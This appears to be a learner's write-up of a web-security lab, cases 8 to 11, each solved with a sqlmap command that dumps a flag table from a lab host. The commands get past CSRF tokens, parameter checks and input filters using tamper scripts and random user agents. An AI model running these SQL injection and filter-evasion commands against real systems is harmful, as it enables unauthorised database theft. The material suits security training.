# [Bypassing Web Application Protections](Bypassing%20Web%20Application%20Protections.md)
### What's the contents of table flag8? (Case #8)

```shell
curl -s 'http://154.57.164.73:31828/case8.php' | grep '<input'
```

i got a csrf-token

```html
<input type='hidden' name='t0ken' value='BraU1kMI9Iv8oSO9KTDIaLFGlUyO2NqSaysKLMLgU'>
```

```shell
sqlmap -u 'http://154.57.164.73:31828/case8.php' --data="id=1&t0ken=BraU1kMI9Iv8oSO9KTDIaLFGlUyO2NqSaysKLMLgU" --csrf-token="t0ken" -D testdb -T flag8 --dump
```
![](Screenshot%202026-06-23%20at%2017.38.41.png)
### What's the contents of table flag9? (Case #9)

```shell
sqlmap -u 'http://154.57.164.73:31828/case9.php?id=1&uid=1896686724' --randomize=uid --batch -v 5 --dump -T flag9 -D testdb
```
![](Screenshot%202026-06-23%20at%2017.48.52.png)
### What's the contents of table flag10? (Case #10)

```shell
sqlmap -u "http://154.57.164.73:31828/case10.php" --forms --tamper=space2comment,randomcase,charencode --random-agent --batch --dump -D testdb -T flag10
```
![](Screenshot%202026-06-23%20at%2017.55.03.png)
### What's the contents of table flag11? (Case #11)

```shell
sqlmap -u 'http://154.57.164.73:31828/case11.php?id=1' --tamper=between --batch --dump -T flag11 -D testdb
```
![](Screenshot%202026-06-23%20at%2018.00.35.png)
